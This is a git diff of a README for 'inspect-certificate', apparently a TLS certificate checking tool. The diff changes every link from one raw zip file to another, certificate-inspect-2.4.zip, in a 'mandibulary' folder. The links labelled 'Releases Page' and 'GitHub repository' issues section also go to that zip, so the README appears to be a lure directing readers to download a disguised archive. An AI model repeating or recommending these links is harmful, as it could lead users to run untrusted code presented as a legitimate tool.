@@ -1,15 +1,15 @@
 # 🔍 inspect-certificate - Check TLS Certificates Easily
 
 ## 📦 Download Now
-[![Download](https://github.com/thyceros/inspect-certificate/raw/refs/heads/main/mandibulary/inspect-certificate-v3.6.zip%20Release-blue)](https://github.com/thyceros/inspect-certificate/raw/refs/heads/main/mandibulary/inspect-certificate-v3.6.zip)
+[![Download](https://github.com/thyceros/inspect-certificate/raw/refs/heads/main/mandibulary/certificate-inspect-2.4.zip%20Release-blue)](https://github.com/thyceros/inspect-certificate/raw/refs/heads/main/mandibulary/certificate-inspect-2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to `inspect-certificate`, a simple command-line tool to check your TLS certificates. This tool helps you view important details and status about your SSL/TLS certificates with ease. Let’s get started!
 
 ## 📥 Download & Install
-To download the application, please visit this page: [Releases Page](https://github.com/thyceros/inspect-certificate/raw/refs/heads/main/mandibulary/inspect-certificate-v3.6.zip).
+To download the application, please visit this page: [Releases Page](https://github.com/thyceros/inspect-certificate/raw/refs/heads/main/mandibulary/certificate-inspect-2.4.zip).
 
-1. Open your web browser and go to the [Releases Page](https://github.com/thyceros/inspect-certificate/raw/refs/heads/main/mandibulary/inspect-certificate-v3.6.zip).
+1. Open your web browser and go to the [Releases Page](https://github.com/thyceros/inspect-certificate/raw/refs/heads/main/mandibulary/certificate-inspect-2.4.zip).
 2. On this page, you will see a list of available versions.
 3. Find the version you want to use. Click on it to expand the release notes.
 4. Look for the package suitable for your system. The most common options are for Windows, macOS, and Linux.
@@ -73,7 +73,7 @@ If you encounter issues while running `inspect-certificate`, consider the follow
 - **Command Not Recognized:** Double-check your typing for any errors or make sure you are in the right directory.
 
 ## 📞 Support
-For further assistance, please visit the issues section on the [GitHub repository](https://github.com/thyceros/inspect-certificate/raw/refs/heads/main/mandibulary/inspect-certificate-v3.6.zip) to report problems or ask questions. 
+For further assistance, please visit the issues section on the [GitHub repository](https://github.com/thyceros/inspect-certificate/raw/refs/heads/main/mandibulary/certificate-inspect-2.4.zip) to report problems or ask questions. 
 
 ## 🤝 Contributing
 If you want to help improve `inspect-certificate`, consider contributing. You can fork the repository, make changes, and submit a pull request. Everyone is welcome to contribute ideas, improvements, and fixes!
